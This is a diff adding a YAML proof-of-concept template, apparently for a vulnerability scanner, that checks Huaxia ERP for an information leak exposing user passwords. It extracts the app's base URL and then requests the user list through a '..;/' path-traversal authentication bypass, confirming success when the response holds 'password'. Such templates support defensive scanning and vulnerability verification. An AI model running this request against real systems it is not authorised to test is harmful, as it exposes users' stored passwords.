@@ -1,0 +1,17 @@
+name: poc-yaml-华夏ERP-信息泄露
+description: >-
+  泄露用户密码
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: GET
+    path: /
+    follow_redirects: true
+    search: window\._CONFIG\['domianURL'\]\s*=\s*'/(?P<url>[^']+)'
+    expression:
+      status: 200
+  - method: GET
+    path: /{{url}}/platformConfig/getPlatform/..;/..;/..;/{{url}}/user/getAllList
+    expression:
+      status: 200
+      body_all: ["password"]
